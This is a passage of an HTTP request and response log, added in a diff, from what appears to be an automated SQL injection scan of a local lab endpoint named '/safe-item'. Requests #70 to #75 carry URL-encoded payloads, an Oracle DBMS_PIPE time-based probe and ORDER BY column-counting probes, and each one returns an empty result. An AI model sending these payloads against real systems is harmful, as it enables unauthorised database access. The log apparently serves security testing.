+GET /safe-item?id=1%27%20AND%203522%3DDBMS_PIPE.RECEIVE_MESSAGE%28CHR%2869%29%7C%7CCHR%2899%29%7C%7CCHR%28110%29%7C%7CCHR%28101%29%2C5%29%20AND%20%27kaBq%27%3D%27kaBq HTTP/1.1
+Host: 127.0.0.1:18080
+User-Agent: Raptor-Assessment/1.0
+Accept: application/json
+Connection: close
+
+HTTP response [#70] (200 OK):
+Server: RaptorAssessmentLab/1.0 Python/3.13.14
+Date: Sat, 08 Aug 2026 07:24:05 GMT
+Content-Type: application/json
+Content-Length: 2
+URI: http://127.0.0.1:18080/safe-item?id=1%27%20AND%203522%3DDBMS_PIPE.RECEIVE_MESSAGE%28CHR%2869%29%7C%7CCHR%2899%29%7C%7CCHR%28110%29%7C%7CCHR%28101%29%2C5%29%20AND%20%27kaBq%27%3D%27kaBq
+
+[]
+
+############################################################################
+
+HTTP request [#71]:
+GET /safe-item?id=1%29%20ORDER%20BY%201--%20dSCJ HTTP/1.1
+Host: 127.0.0.1:18080
+User-Agent: Raptor-Assessment/1.0
+Accept: application/json
+Connection: close
+
+HTTP response [#71] (200 OK):
+Server: RaptorAssessmentLab/1.0 Python/3.13.14
+Date: Sat, 08 Aug 2026 07:24:05 GMT
+Content-Type: application/json
+Content-Length: 2
+URI: http://127.0.0.1:18080/safe-item?id=1%29%20ORDER%20BY%201--%20dSCJ
+
+[]
+
+############################################################################
+
+HTTP request [#72]:
+GET /safe-item?id=1%20ORDER%20BY%201--%20HAeg HTTP/1.1
+Host: 127.0.0.1:18080
+User-Agent: Raptor-Assessment/1.0
+Accept: application/json
+Connection: close
+
+HTTP response [#72] (200 OK):
+Server: RaptorAssessmentLab/1.0 Python/3.13.14
+Date: Sat, 08 Aug 2026 07:24:05 GMT
+Content-Type: application/json
+Content-Length: 2
+URI: http://127.0.0.1:18080/safe-item?id=1%20ORDER%20BY%201--%20HAeg
+
+[]
+
+############################################################################
+
+HTTP request [#73]:
+GET /safe-item?id=1%20ORDER%20BY%201--%20hqUR HTTP/1.1
+Host: 127.0.0.1:18080
+User-Agent: Raptor-Assessment/1.0
+Accept: application/json
+Connection: close
+
+HTTP response [#73] (200 OK):
+Server: RaptorAssessmentLab/1.0 Python/3.13.14
+Date: Sat, 08 Aug 2026 07:24:05 GMT
+Content-Type: application/json
+Content-Length: 2
+URI: http://127.0.0.1:18080/safe-item?id=1%20ORDER%20BY%201--%20hqUR
+
+[]
+
+############################################################################
+
+HTTP request [#74]:
+GET /safe-item?id=1%27%29%20ORDER%20BY%201--%20XQZU HTTP/1.1
+Host: 127.0.0.1:18080
+User-Agent: Raptor-Assessment/1.0
+Accept: application/json
+Connection: close
+
+HTTP response [#74] (200 OK):
+Server: RaptorAssessmentLab/1.0 Python/3.13.14
+Date: Sat, 08 Aug 2026 07:24:05 GMT
+Content-Type: application/json
+Content-Length: 2
+URI: http://127.0.0.1:18080/safe-item?id=1%27%29%20ORDER%20BY%201--%20XQZU
+
+[]
+
+############################################################################
+
+HTTP request [#75]:
+GET /safe-item?id=1%27%20ORDER%20BY%201--%20fHND HTTP/1.1
+Host: 127.0.0.1:18080
+User-Agent: Raptor-Assessment/1.0
+Accept: application/json
+Connection: close
+
+HTTP response [#75] (200 OK):
+Server: RaptorAssessmentLab/1.0 Python/3.13.14
+Date: Sat, 08 Aug 2026 07:24:05 GMT
+Content-Type: application/json
+Content-Length: 2
+URI: http://127.0.0.1:18080/safe-item?id=1%27%20ORDER%20BY%201--%20fHND
+
+[]
+
+############################################################################
+
